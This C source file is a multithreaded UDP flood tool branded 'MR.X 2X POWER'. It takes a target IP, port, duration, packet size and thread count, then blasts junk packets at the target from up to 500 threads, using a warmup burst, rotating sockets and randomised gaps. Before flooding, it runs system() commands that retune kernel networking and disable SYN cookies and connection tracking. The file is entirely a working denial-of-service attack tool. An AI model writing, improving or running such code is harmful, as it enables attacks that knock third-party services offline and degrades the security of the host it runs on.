#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <time.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/time.h>
#include <errno.h>
#include <signal.h>

#define HYPER_LOOPS 480
#define INNER_LOOPS 160
#define EXTRA_BURST 32
#define BUFFER_ROTATION 5
#define PRE_ALLOC_COUNT 600000

#define MAX_PACKET_SIZE 128
#define MIN_PACKET_SIZE 24
#define MAX_THREADS 500
#define MIN_THREADS 50
#define MAX_DURATION 300
#define MIN_DURATION 10

#define SOCKET_SNDBUF (50 * 1024 * 1024)
#define SOCKET_RCVBUF (25 * 1024 * 1024)

#define RANDOM_GAP_CHANCE 30
#define MIN_GAP_US 50
#define MAX_GAP_US 1000

#define WARMUP_SECONDS 8
#define WARMUP_MULTIPLIER 8
#define WARMUP_PACKET_SIZE 24

char *TARGET_IP;
int TARGET_PORT;
int ATTACK_DURATION;
int PACKET_SIZE;
int THREAD_COUNT;

volatile unsigned long long total_packets = 0;
volatile int monitor_running = 1;
volatile int stop_all_threads = 0;

pthread_t monitor_thread;
char **packet_pool = NULL;
char **warmup_packets = NULL;

void signal_handler(int sig) {
    monitor_running = 0;
    stop_all_threads = 1;
    fprintf(stderr, "\n⚠️ Stopping...\n");
}

void optimize_kernel() {
#ifdef __linux__
    system("sysctl -w net.core.wmem_max=1073741824 >/dev/null 2>&1");
    system("sysctl -w net.core.wmem_default=268435456 >/dev/null 2>&1");
    system("sysctl -w net.core.rmem_max=1073741824 >/dev/null 2>&1");
    system("sysctl -w net.core.rmem_default=268435456 >/dev/null 2>&1");
    system("sysctl -w net.core.netdev_max_backlog=10000000 >/dev/null 2>&1");
    system("sysctl -w net.core.optmem_max=33554432 >/dev/null 2>&1");
    system("sysctl -w net.core.somaxconn=1048576 >/dev/null 2>&1");
    system("sysctl -w net.core.netdev_budget=5000 >/dev/null 2>&1");
    system("sysctl -w net.core.netdev_budget_usecs=60000 >/dev/null 2>&1");
    system("sysctl -w net.core.dev_weight=5000 >/dev/null 2>&1");
    system("sysctl -w net.ipv4.udp_mem='25165824 50331648 100663296' >/dev/null 2>&1");
    system("sysctl -w net.ipv4.udp_rmem_min=131072 >/dev/null 2>&1");
    system("sysctl -w net.ipv4.udp_wmem_min=131072 >/dev/null 2>&1");
    system("sysctl -w net.ipv4.ip_local_port_range='1024 65535' >/dev/null 2>&1");
    system("sysctl -w net.ipv4.tcp_timestamps=0 >/dev/null 2>&1");
    system("sysctl -w net.ipv4.tcp_sack=0 >/dev/null 2>&1");
    system("sysctl -w net.ipv4.tcp_syncookies=0 >/dev/null 2>&1");
    system("sysctl -w net.ipv4.tcp_ecn=0 >/dev/null 2>&1");
    system("sysctl -w net.ipv4.tcp_window_scaling=0 >/dev/null 2>&1");
    system("sysctl -w net.netfilter.nf_conntrack_max=0 >/dev/null 2>&1 2>/dev/null");
    system("sysctl -w vm.swappiness=0 >/dev/null 2>&1");
    system("sysctl -w vm.dirty_ratio=90 >/dev/null 2>&1");
    system("sysctl -w vm.dirty_background_ratio=70 >/dev/null 2>&1");
    system("sysctl -w vm.overcommit_memory=1 >/dev/null 2>&1");
    system("sysctl -w vm.min_free_kbytes=131072 >/dev/null 2>&1");
    system("sysctl -w net.core.busy_poll=50 >/dev/null 2>&1");
    system("sysctl -w net.core.busy_read=50 >/dev/null 2>&1");
    system("ulimit -n 1048576 >/dev/null 2>&1");
    system("ulimit -u unlimited >/dev/null 2>&1");
    system("sysctl -w kernel.sched_min_granularity_ns=100000 >/dev/null 2>&1");
    system("sysctl -w kernel.sched_wakeup_granularity_ns=50000 >/dev/null 2>&1");
    system("sysctl -w kernel.sched_migration_cost_ns=0 >/dev/null 2>&1");
    system("for iface in $(ip -o link show | awk -F': ' '{print $2}' 2>/dev/null); do ethtool -K $iface tx off rx off sg off tso off gso off gro off lro off 2>/dev/null; ethtool -G $iface rx 8192 tx 8192 2>/dev/null; ethtool -C $iface rx-usecs 0 rx-frames 0 tx-usecs 0 tx-frames 0 2>/dev/null; done 2>/dev/null");
#endif
}

void init_packet_pool() {
    packet_pool = malloc(PRE_ALLOC_COUNT * sizeof(char*));
    if (!packet_pool) {
        fprintf(stderr, "Memory allocation failed for packet_pool\n");
        exit(EXIT_FAILURE);
    }
    
    for(int i = 0; i < PRE_ALLOC_COUNT; i++) {
        packet_pool[i] = malloc(PACKET_SIZE);
        if (!packet_pool[i]) {
            fprintf(stderr, "Memory allocation failed for packet %d\n", i);
            exit(EXIT_FAILURE);
        }
        
        uint32_t *header = (uint32_t*)packet_pool[i];
        header[0] = 0x4752414D;
        header[1] = htonl(TARGET_PORT) ^ rand();
        
        for(int j = 8; j < PACKET_SIZE; j++) {
            int pattern_type = i % 5;
            switch(pattern_type) {
                case 0: packet_pool[i][j] = 0xFF; break;
                case 1: packet_pool[i][j] = (rand() + j) & 0xFF; break;
                case 2: packet_pool[i][j] = (j % 16) * 0x11; break;
                case 3: packet_pool[i][j] = 0x00; break;
                case 4: packet_pool[i][j] = 0x80 | (rand() & 0x7F); break;
            }
        }
        mlock(packet_pool[i], PACKET_SIZE);
    }
}

void init_warmup_packets() {
    warmup_packets = malloc(PRE_ALLOC_COUNT * sizeof(char*));
    if (!warmup_packets) {
        fprintf(stderr, "Memory allocation failed for warmup_packets\n");
        exit(EXIT_FAILURE);
    }
    
    for(int i = 0; i < PRE_ALLOC_COUNT; i++) {
        warmup_packets[i] = malloc(WARMUP_PACKET_SIZE);
        if (!warmup_packets[i]) {
            fprintf(stderr, "Memory allocation failed for warmup packet %d\n", i);
            exit(EXIT_FAILURE);
        }
        
        uint32_t *header = (uint32_t*)warmup_packets[i];
        header[0] = 0xFFFFFFFF;
        header[1] = 0x00000000;
        
        for(int j = 8; j < WARMUP_PACKET_SIZE; j++) {
            switch((i + j) % 7) {
                case 0: warmup_packets[i][j] = 0xFF; break;
                case 1: warmup_packets[i][j] = 0x00; break;
                case 2: warmup_packets[i][j] = 0xAA; break;
                case 3: warmup_packets[i][j] = 0x55; break;
                case 4: warmup_packets[i][j] = 0xF0; break;
                case 5: warmup_packets[i][j] = 0x0F; break;
                case 6: warmup_packets[i][j] = rand() & 0xFF; break;
            }
        }
        mlock(warmup_packets[i], WARMUP_PACKET_SIZE);
    }
}

void cleanup_pool() {
    if (packet_pool) {
        for(int i = 0; i < PRE_ALLOC_COUNT; i++) {
            if(packet_pool[i]) {
                free(packet_pool[i]);
            }
        }
        free(packet_pool);
    }
    if (warmup_packets) {
        for(int i = 0; i < PRE_ALLOC_COUNT; i++) {
            if(warmup_packets[i]) {
                free(warmup_packets[i]);
            }
        }
        free(warmup_packets);
    }
}

void *pps_monitor(void *arg) {
    unsigned long long prev_count = 0;
    unsigned long long peak_pps = 0;
    
    while (monitor_running) {
        sleep(1);
        unsigned long long current_count = total_packets;
        unsigned long long pps = current_count - prev_count;
        prev_count = current_count;
        
        if (pps > peak_pps) peak_pps = pps;
        unsigned long long pps_k = pps / 1000;
        if (pps_k == 0 && pps > 0) pps_k = 1;
        
        fprintf(stderr, "%lluK|P:%lluK\n", pps_k, peak_pps/1000);
        fflush(stderr);
    }
    return NULL;
}

void *send_hyper_packets(void *arg) {
    int socks[BUFFER_ROTATION];
    struct sockaddr_in servaddr;
    time_t start_time = time(NULL);
    time_t warmup_end = start_time + WARMUP_SECONDS;
    time_t attack_end = start_time + WARMUP_SECONDS + ATTACK_DURATION;
    
    memset(&servaddr, 0, sizeof(servaddr));
    servaddr.sin_family = AF_INET;
    servaddr.sin_port = htons(TARGET_PORT);
    servaddr.sin_addr.s_addr = inet_addr(TARGET_IP);
    
    for(int s = 0; s < BUFFER_ROTATION; s++) {
        socks[s] = socket(AF_INET, SOCK_DGRAM, 0);
        if (socks[s] < 0) {
            for(int k = 0; k < s; k++) close(socks[k]);
            return NULL;
        }
        
        int broadcast = 1;
        int sndbuf = SOCKET_SNDBUF;
        int rcvbuf = SOCKET_RCVBUF;
        setsockopt(socks[s], SOL_SOCKET, SO_BROADCAST, &broadcast, sizeof(broadcast));
        setsockopt(socks[s], SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));
        setsockopt(socks[s], SOL_SOCKET, SO_RCVBUF, &rcvbuf, sizeof(rcvbuf));
        setsockopt(socks[s], SOL_SOCKET, SO_REUSEADDR, &broadcast, sizeof(broadcast));
        fcntl(socks[s], F_SETFL, O_NONBLOCK);
        
        struct sockaddr_in src_addr;
        memset(&src_addr, 0, sizeof(src_addr));
        src_addr.sin_family = AF_INET;
        src_addr.sin_port = htons(10000 + ((int)(long)arg * 100) + s);
        src_addr.sin_addr.s_addr = INADDR_ANY;
        
        if (bind(socks[s], (struct sockaddr*)&src_addr, sizeof(src_addr)) < 0) {
            close(socks[s]);
            socks[s] = -1;
        }
    }
    
    int warmup_index = (int)(long)arg % PRE_ALLOC_COUNT;
    unsigned long long warmup_count = 0;
    
    while (time(NULL) < warmup_end && !stop_all_threads) {
        for (int mega_burst = 0; mega_burst < HYPER_LOOPS * WARMUP_MULTIPLIER && !stop_all_threads; mega_burst++) {
            for (int s = 0; s < BUFFER_ROTATION && !stop_all_threads; s++) {
                if (socks[s] < 0) continue;
                
                sendto(socks[s], warmup_packets[warmup_index], WARMUP_PACKET_SIZE, MSG_DONTWAIT, 
                       (struct sockaddr *)&servaddr, sizeof(servaddr));
                warmup_index = (warmup_index + 1) % PRE_ALLOC_COUNT;
                warmup_count++;
                
                sendto(socks[s], warmup_packets[warmup_index], WARMUP_PACKET_SIZE, MSG_DONTWAIT, 
                       (struct sockaddr *)&servaddr, sizeof(servaddr));
                warmup_index = (warmup_index + 1) % PRE_ALLOC_COUNT;
                warmup_count++;
            }
            
            for (int i = 0; i < INNER_LOOPS * 2 && !stop_all_threads; i++) {
                int current_sock = socks[i % BUFFER_ROTATION];
                if (current_sock < 0) continue;
                
                sendto(current_sock, warmup_packets[warmup_index], WARMUP_PACKET_SIZE, MSG_DONTWAIT, 
                       (struct sockaddr *)&servaddr, sizeof(servaddr));
                warmup_index = (warmup_index + 1) % PRE_ALLOC_COUNT;
                warmup_count++;
            }
        }
    }
    
    __sync_fetch_and_add(&total_packets, warmup_count);
    
    int local_pool_index = (int)(long)arg % PRE_ALLOC_COUNT;
    int socket_rotate = 0;
    unsigned long long local_count = 0;
    int sock_errors[BUFFER_ROTATION] = {0};
    
    while (time(NULL) < attack_end && !stop_all_threads) {
        for (int mega_burst = 0; mega_burst < HYPER_LOOPS && !stop_all_threads; mega_burst++) {
            int current_sock = socks[socket_rotate % BUFFER_ROTATION];
            if (current_sock < 0) {
                socket_rotate++;
                continue;
            }
            
            if (sock_errors[socket_rotate % BUFFER_ROTATION] > 20) {
                close(current_sock);
                socks[socket_rotate % BUFFER_ROTATION] = socket(AF_INET, SOCK_DGRAM, 0);
                if (socks[socket_rotate % BUFFER_ROTATION] >= 0) {
                    int broadcast = 1;
                    int sndbuf = SOCKET_SNDBUF;
                    int rcvbuf = SOCKET_RCVBUF;
                    setsockopt(socks[socket_rotate % BUFFER_ROTATION], SOL_SOCKET, SO_BROADCAST, &broadcast, sizeof(broadcast));
                    setsockopt(socks[socket_rotate % BUFFER_ROTATION], SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));
                    setsockopt(socks[socket_rotate % BUFFER_ROTATION], SOL_SOCKET, SO_RCVBUF, &rcvbuf, sizeof(rcvbuf));
                    fcntl(socks[socket_rotate % BUFFER_ROTATION], F_SETFL, O_NONBLOCK);
                }
                sock_errors[socket_rotate % BUFFER_ROTATION] = 0;
                current_sock = socks[socket_rotate % BUFFER_ROTATION];
            }
            
            if (current_sock >= 0) {
                int ret = sendto(current_sock, packet_pool[local_pool_index], PACKET_SIZE, 
                               MSG_DONTWAIT, (struct sockaddr *)&servaddr, sizeof(servaddr));
                if (ret < 0) {
                    sock_errors[socket_rotate % BUFFER_ROTATION]++;
                    if (errno == ENOBUFS) usleep(100);
                } else {
                    local_count++;
                    sock_errors[socket_rotate % BUFFER_ROTATION] = 0;
                }
            }
            
            local_pool_index = (local_pool_index + 1) % PRE_ALLOC_COUNT;
            socket_rotate++;
            
            if (current_sock >= 0) {
                int ret = sendto(current_sock, packet_pool[local_pool_index], PACKET_SIZE,
                               MSG_DONTWAIT, (struct sockaddr *)&servaddr, sizeof(servaddr));
                if (ret < 0) {
                    sock_errors[socket_rotate % BUFFER_ROTATION]++;
                    if (errno == ENOBUFS) usleep(100);
                } else {
                    local_count++;
                    sock_errors[socket_rotate % BUFFER_ROTATION] = 0;
                }
            }
            
            local_pool_index = (local_pool_index + 1) % PRE_ALLOC_COUNT;
            socket_rotate++;
            
            for (int i = 0; i < INNER_LOOPS && !stop_all_threads; i++) {
                current_sock = socks[socket_rotate % BUFFER_ROTATION];
                if (current_sock < 0) {
                    socket_rotate++;
                    continue;
                }
                
                int ret = sendto(current_sock, packet_pool[local_pool_index], PACKET_SIZE,
                               MSG_DONTWAIT, (struct sockaddr *)&servaddr, sizeof(servaddr));
                if (ret < 0) {
                    sock_errors[socket_rotate % BUFFER_ROTATION]++;
                    if (errno == ENOBUFS) usleep(100);
                } else {
                    local_count++;
                    sock_errors[socket_rotate % BUFFER_ROTATION] = 0;
                }
                
                local_pool_index = (local_pool_index + 1) % PRE_ALLOC_COUNT;
                socket_rotate++;
                
                ret = sendto(current_sock, packet_pool[local_pool_index], PACKET_SIZE,
                           MSG_DONTWAIT, (struct sockaddr *)&servaddr, sizeof(servaddr));
                if (ret < 0) {
                    sock_errors[socket_rotate % BUFFER_ROTATION]++;
                    if (errno == ENOBUFS) usleep(100);
                } else {
                    local_count++;
                    sock_errors[socket_rotate % BUFFER_ROTATION] = 0;
                }
                
                local_pool_index = (local_pool_index + 1) % PRE_ALLOC_COUNT;
                socket_rotate++;
            }
            
            for (int extra = 0; extra < EXTRA_BURST && !stop_all_threads; extra++) {
                current_sock = socks[socket_rotate % BUFFER_ROTATION];
                if (current_sock < 0) {
                    socket_rotate++;
                    continue;
                }
                
                int ret = sendto(current_sock, packet_pool[local_pool_index], PACKET_SIZE,
                               MSG_DONTWAIT, (struct sockaddr *)&servaddr, sizeof(servaddr));
                if (ret < 0) {
                    sock_errors[socket_rotate % BUFFER_ROTATION]++;
                    if (errno == ENOBUFS) usleep(100);
                } else {
                    local_count++;
                    sock_errors[socket_rotate % BUFFER_ROTATION] = 0;
                }
                
                local_pool_index = (local_pool_index + 1) % PRE_ALLOC_COUNT;
                socket_rotate++;
                
                ret = sendto(current_sock, packet_pool[local_pool_index], PACKET_SIZE,
                           MSG_DONTWAIT, (struct sockaddr *)&servaddr, sizeof(servaddr));
                if (ret < 0) {
                    sock_errors[socket_rotate % BUFFER_ROTATION]++;
                    if (errno == ENOBUFS) usleep(100);
                } else {
                    local_count++;
                    sock_errors[socket_rotate % BUFFER_ROTATION] = 0;
                }
                
                local_pool_index = (local_pool_index + 1) % PRE_ALLOC_COUNT;
                socket_rotate++;
            }
            
            if(local_count >= 10000) {
                __sync_fetch_and_add(&total_packets, local_count);
                local_count = 0;
            }
            
            if((rand() % 100) < RANDOM_GAP_CHANCE && !stop_all_threads) {
                usleep(MIN_GAP_US + (rand() % (MAX_GAP_US - MIN_GAP_US)));
            }
        }
    }
    
    if(local_count > 0) {
        __sync_fetch_and_add(&total_packets, local_count);
    }
    
    for(int s = 0; s < BUFFER_ROTATION; s++) {
        if(socks[s] >= 0) close(socks[s]);
    }
    
    return NULL;
}

int main(int argc, char *argv[]) {
    signal(SIGINT, signal_handler);
    signal(SIGTERM, signal_handler);
    
    if (argc != 6) {
        fprintf(stderr, "Use: ./mrx [IP] [PORT] [TIME] [SIZE] [THREADS]\n");
        exit(EXIT_FAILURE);
    }

    TARGET_IP = argv[1];
    TARGET_PORT = atoi(argv[2]);
    ATTACK_DURATION = atoi(argv[3]);
    PACKET_SIZE = atoi(argv[4]);
    THREAD_COUNT = atoi(argv[5]);

    if (TARGET_PORT <= 0 || TARGET_PORT > 65535) {
        fprintf(stderr, "Error: Invalid port\n");
        exit(EXIT_FAILURE);
    }
    
    if (ATTACK_DURATION < MIN_DURATION) ATTACK_DURATION = MIN_DURATION;
    if (ATTACK_DURATION > MAX_DURATION) ATTACK_DURATION = MAX_DURATION;
    
    if (PACKET_SIZE < MIN_PACKET_SIZE) PACKET_SIZE = MIN_PACKET_SIZE;
    if (PACKET_SIZE > MAX_PACKET_SIZE) PACKET_SIZE = MAX_PACKET_SIZE;
    
    if (THREAD_COUNT < MIN_THREADS) THREAD_COUNT = MIN_THREADS;
    if (THREAD_COUNT > MAX_THREADS) THREAD_COUNT = MAX_THREADS;

    fprintf(stderr, "💣 MR.X 2X POWER 🔥Started🔥\n");
    fflush(stderr);
    
    srand(time(NULL));
    optimize_kernel();
    init_packet_pool();
    init_warmup_packets();
    
    fprintf(stderr, "🚀 Initializing...\n");
    sleep(2);
    fprintf(stderr, "✅ Ready\n");
    
    pthread_create(&monitor_thread, NULL, pps_monitor, NULL);

    pthread_t *threads = malloc(THREAD_COUNT * sizeof(pthread_t));
    if (threads == NULL) {
        fprintf(stderr, "Memory failed for threads\n");
        cleanup_pool();
        return EXIT_FAILURE;
    }

    for (int i = 0; i < THREAD_COUNT; i++) {
        if (pthread_create(&threads[i], NULL, send_hyper_packets, (void*)(long)i) != 0) {
            fprintf(stderr, "Failed to create thread %d\n", i);
            stop_all_threads = 1;
            break;
        }
        usleep(300);
    }

    int total_sleep_time = WARMUP_SECONDS + ATTACK_DURATION;
    for (int sec = 0; sec < total_sleep_time && !stop_all_threads; sec++) {
        sleep(1);
    }
    
    stop_all_threads = 1;
    monitor_running = 0;
    
    for (int j = 0; j < THREAD_COUNT; j++) {
        if (threads[j]) {
            pthread_join(threads[j], NULL);
        }
    }

    pthread_join(monitor_thread, NULL);
    cleanup_pool();
    free(threads);
    
    unsigned long long avg_pps = total_packets / (WARMUP_SECONDS + ATTACK_DURATION);
    unsigned long long total_mb = (total_packets * PACKET_SIZE) / (1024 * 1024);
    unsigned long long total_gb = total_mb / 1024;
    
    fprintf(stderr, "🟢 MR.X 2X Completed ⚡️\n");
    fprintf(stderr, "DONE|%lluKavg|%llupackets|%lluMB|%lluGB\n", avg_pps/1000, total_packets, total_mb, total_gb);
    fflush(stderr);

    return 0;
}